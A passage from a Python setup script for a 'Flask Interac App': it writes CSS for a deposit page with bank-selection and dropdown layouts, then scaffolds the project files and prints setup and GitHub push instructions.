    margin-top: 20px;
}

.dropdown-group {
    flex: 1;
}

.dropdown-group label {
    display: block;
    margin-bottom: 5px;
    font-weight: bold;
    color: #333;
}

.dropdown-group select {
    width: 100%;
    padding: 10px;
    border: 2px solid #e0e0e0;
    border-radius: 5px;
    font-size: 14px;
    background-color: white;
}

@media (max-width: 768px) {
    .header {
        flex-direction: column;
        gap: 10px;
    }

    .nav-menu {
        flex-wrap: wrap;
        justify-content: center;
    }

    .main-container {
        margin: 10px;
        padding: 20px;
    }

    .deposit-header {
        flex-direction: column;
        gap: 15px;
    }

    .expires-info {
        text-align: left;
    }

    .banks-grid {
        grid-template-columns: repeat(2, 1fr);
        gap: 10px;
    }

    .dropdown-section {
        flex-direction: column;
    }

    .amount {
        font-size: 28px;
    }
}

@media (max-width: 480px) {
    .banks-grid {
        grid-template-columns: 1fr;
    }

    .bank-option {
        padding: 15px;
    }
}'''
    
    with open('static/style.css', 'w') as f:
        f.write(content)
    print("✅ Created static/style.css")

def main():
    """Main setup function"""
    print("\n🚀 Flask Interac App - Project Setup\n")
    print("=" * 50)
    
    create_directory_structure()
    create_app_py()
    create_requirements()
    create_start_sh()
    create_gitignore()
    create_readme()
    create_index_html()
    create_page_templates()
    create_css()
    
    print("\n" + "=" * 50)
    print("✨ Setup complete! Your project is ready.")
    print("\nNext steps:")
    print("1. Create a virtual environment: python -m venv venv")
    print("2. Activate it: source venv/bin/activate")
    print("3. Install dependencies: pip install -r requirements.txt")
    print("4. Run the app: ./start.sh")
    print("\nTo push to GitHub:")
    print("1. git init")
    print("2. git add .")
    print("3. git commit -m 'Initial commit'")
    print("4. git remote add origin YOUR_GITHUB_URL")
    print("5. git push -u origin main")
    print("=" * 50 + "\n")

if __name__ == "__main__":
    main()
